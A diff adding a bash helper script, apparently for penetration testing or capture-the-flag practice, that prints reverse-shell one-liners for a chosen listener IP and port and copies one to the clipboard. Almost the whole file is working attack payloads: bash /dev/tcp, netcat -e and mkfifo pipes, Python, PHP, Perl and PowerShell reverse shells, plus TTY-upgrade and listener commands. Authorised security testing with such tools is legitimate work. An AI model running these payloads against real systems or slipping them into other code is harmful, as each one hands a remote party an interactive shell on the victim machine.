@@ -1,0 +1,28 @@
+#!/usr/bin/env bash
+# revshell [lhost] [lport] [shell]   e.g. revshell 10.10.14.5 4444 bash
+# Defaults: lhost=$LHOST (VPN IP), lport=4444, shell=bash. Copies the first one to clipboard.
+LHOST="${1:-${LHOST:-$(~/.local/bin/hackbar vpn plain 2>/dev/null)}}"
+LPORT="${2:-4444}"
+SH="${3:-bash}"
+C=$'\e[38;2;122;162;247m'; Y=$'\e[38;2;224;175;104m'; D=$'\e[38;2;86;95;137m'; G=$'\e[38;2;158;206;106m'; X=$'\e[0m'
+[ -z "$LHOST" ] && { echo "no LHOST — pass one: revshell <ip> [port]"; exit 1; }
+printf "${D}# LHOST=${X}${Y}%s${D}  LPORT=${X}${Y}%s${X}\n\n" "$LHOST" "$LPORT"
+
+declare -A r
+r[bash]="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
+r[bash2]="0<&196;exec 196<>/dev/tcp/$LHOST/$LPORT; bash <&196 >&196 2>&196"
+r[nc]="nc -e /bin/bash $LHOST $LPORT"
+r[ncmkfifo]="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LHOST $LPORT >/tmp/f"
+r[python3]="python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$LHOST\",$LPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
+r[php]="php -r '\$s=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
+r[perl]="perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'"
+r[powershell]="powershell -nop -c \"\$c=New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$sd=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sd,0,\$sd.Length);\$s.Flush()}\""
+
+show(){ printf "${C}%s${X}\n${G}%s${X}\n\n" "$1" "${r[$1]}"; }
+if [ -n "${r[$SH]}" ]; then show "$SH"; else
+  echo "unknown shell '$SH'. options: ${!r[*]}"; exit 1
+fi
+# also print upgrade tip + copy to clipboard
+if command -v xclip >/dev/null; then printf '%s' "${r[$SH]}" | (setsid xclip -selection clipboard >/dev/null 2>&1 &) && printf "${D}(copied to clipboard)${X}\n"; fi
+printf "${D}TTY upgrade after catching it:${X}\n${G}python3 -c 'import pty;pty.spawn(\"/bin/bash\")'${X}  ${D}then Ctrl-Z, ${G}stty raw -echo;fg${D}, ${G}export TERM=xterm${X}\n"
+printf "${D}listen with:${X} ${G}rlwrap -cAr nc -lvnp %s${X}\n" "$LPORT"
